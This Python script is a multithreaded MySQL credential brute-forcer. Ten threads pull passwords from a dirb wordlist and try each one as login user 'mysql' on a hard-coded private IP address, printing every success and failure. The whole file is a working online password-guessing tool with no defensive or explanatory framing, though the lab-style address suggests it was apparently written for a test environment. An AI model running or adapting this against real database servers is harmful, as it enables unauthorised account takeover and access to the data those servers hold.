import pymysql
import threading
import queue
class brute_mysql_thread(threading.Thread):
    def __init__(self,host,user,q):
        threading.Thread.__init__(self)
        self.host = host
        self.user = user
        self.q = q
    def run(self):
        while not self.q.empty():
            password = self.q.get()
            state = brute_mysql(self.host,self.user,password)
            if state == True:
                self.q.queue.clear()
                break
            elif state == False:
                continue

def brute_mysql(host,user,password):
    try:
        db  = pymysql.connect(host,user,password)
        print("[+] Success host:%s user:%s password:%s" %(host,user,password))
        return True
    except:
        print("[-] user:%s password:%s" %(user,password))
        return False
    else:
        db.close()

def get_password(drib):
    q = queue.Queue()
    with open(drib) as f:
        for line in f:
            password = line.strip('\r').strip('\n')
            q.put(password)
    return q

def main():
    dirb = '/usr/share/wordlists/dirb/small.txt'
    host = '172.20.10.139'
    user = 'mysql'
    threads = []
    q = get_password(dirb)
    for i in range(10):
        thread = brute_mysql_thread(host,user,q)
        thread.start()
        threads.append(thread)

    for t in threads:
        t.join()



if __name__=='__main__':
    main()
